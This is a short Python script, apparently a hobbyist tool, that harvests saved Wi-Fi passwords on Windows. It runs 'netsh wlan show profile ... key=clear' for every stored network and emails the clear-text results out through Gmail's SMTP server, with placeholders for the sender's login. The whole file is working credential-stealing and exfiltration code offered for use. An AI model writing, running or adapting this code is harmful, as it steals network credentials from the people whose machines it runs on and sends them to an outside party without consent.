import smtplib
import subprocess,re



#made by me osama asasfah //osama.alasasfah@gmail.com
def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command_all="netsh wlan show profile"
networks=subprocess.check_output(command_all,shell=True)
my_network_names=re.findall(r"(?:Profile\s*:\s)(.*)",str(networks))
strr=my_network_names[0]

strr = strr.replace('    All User Profile     :', '')
strr = strr.replace('\\r\\n\\r\\n', '')
strr=strr.replace('\\r\\n', ',')

my_network_names = strr.split(",")
result=""

for network_name in my_network_names:
    try:
        print(network_name)
        command = "netsh wlan show profile " + network_name + " key=clear"
        current_result = subprocess.check_output(command, shell=True)
        result = result + current_result.decode("utf-8")
    except Exception:
        print("Network Not found.")

send_mail("Inter Your Email","Your pass or email app pass",result)
